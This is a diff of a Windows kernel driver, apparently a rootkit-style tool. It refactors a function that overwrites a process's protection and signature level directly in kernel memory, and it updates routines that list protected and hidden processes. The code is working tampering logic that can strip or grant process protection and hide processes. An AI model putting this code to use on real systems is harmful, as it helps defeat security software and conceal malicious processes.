@@ -228,36 +228,36 @@ NTSTATUS ProcessHandler::ElevateProcess(_In_ ULONG pid) {
 * SetProcessSignature is responsible for removing or adding process protection to a certain process.
 *
 * Parameters:
-* @ProcessSignature [ProcessSignature*] -- Contains the process PID, signer type and signature signer.
+* @processSignature [ProcessSignature*] -- Contains the process PID, signer type and signature signer.
 *
 * Returns:
 * @status  			[NTSTATUS] 			-- Whether the operation was successful or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS ProcessHandler::SetProcessSignature(_In_ ProcessSignature* ProcessSignature) {
+NTSTATUS ProcessHandler::SetProcessSignature(_In_ ProcessSignature* processSignature) {
 	PEPROCESS process;
 	NTSTATUS status = STATUS_SUCCESS;
 
-	if (!IsValidPid(ProcessSignature->Pid))
+	if (!IsValidPid(processSignature->Pid))
 		return STATUS_INVALID_PARAMETER;
 
-	status = PsLookupProcessByProcessId(ULongToHandle(ProcessSignature->Pid), &process);
+	status = PsLookupProcessByProcessId(ULongToHandle(processSignature->Pid), &process);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	UCHAR newSignatureLevel = (ProcessSignature->SignerType << 4) | ProcessSignature->SignatureSigner;
+	UCHAR newSignatureLevel = (processSignature->SignerType << 4) | processSignature->SignatureSigner;
 	ULONG signatureLevelOffset = GetSignatureLevelOffset();
 
 	if (signatureLevelOffset == 0) {
 		ObDereferenceObject(process);
 		return STATUS_UNSUCCESSFUL;
 	}
-	PPROCESS_SIGNATURE processSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + GetSignatureLevelOffset());
+	PPROCESS_SIGNATURE targetProcessSignature = reinterpret_cast<PPROCESS_SIGNATURE>(reinterpret_cast<UINT64>(process) + signatureLevelOffset);
 
-	processSignature->SignatureLevel = newSignatureLevel;
-	processSignature->Protection.Type = ProcessSignature->SignerType;
-	processSignature->Protection.Signer = ProcessSignature->SignatureSigner;
+	targetProcessSignature->SignatureLevel = newSignatureLevel;
+	targetProcessSignature->Protection.Type = processSignature->SignerType;
+	targetProcessSignature->Protection.Signer = processSignature->SignatureSigner;
 
 	ObDereferenceObject(process);
 	return status;
@@ -458,12 +458,15 @@ bool ProcessHandler::ListProtectedProcesses(_Inout_ IoctlProcessList* processLis
 		ProtectedProcessEntry* item = CONTAINING_RECORD(currentEntry, ProtectedProcessEntry, Entry);
 
 		if (item) {
-			status = WriteProcessMemory(
+			status = MmCopyVirtualMemory(
+				PsGetCurrentProcess(),
 				&item->Pid,
 				PsGetCurrentProcess(),
-				processList->Processes + count ,
+				&processList->Processes[count],
 				sizeof(ULONG),
-				UserMode);
+				UserMode,
+				nullptr
+			);
 
 			if (!NT_SUCCESS(status)) {
 				processList->Count = count;
@@ -514,12 +517,15 @@ bool ProcessHandler::ListHiddenProcesses(_Inout_ IoctlProcessList* processList) 
 		HiddenProcessEntry* item = CONTAINING_RECORD(currentEntry, HiddenProcessEntry, Entry);
 
 		if (item) {
-			status = WriteProcessMemory(
+			status = MmCopyVirtualMemory(
+				PsGetCurrentProcess(),
 				&item->Pid,
 				PsGetCurrentProcess(),
-				processList->Processes + count,
+				&processList->Processes[count],
 				sizeof(ULONG),
-				UserMode);
+				UserMode,
+				nullptr
+			);
 
 			if (!NT_SUCCESS(status)) {
 				processList->Count = count;
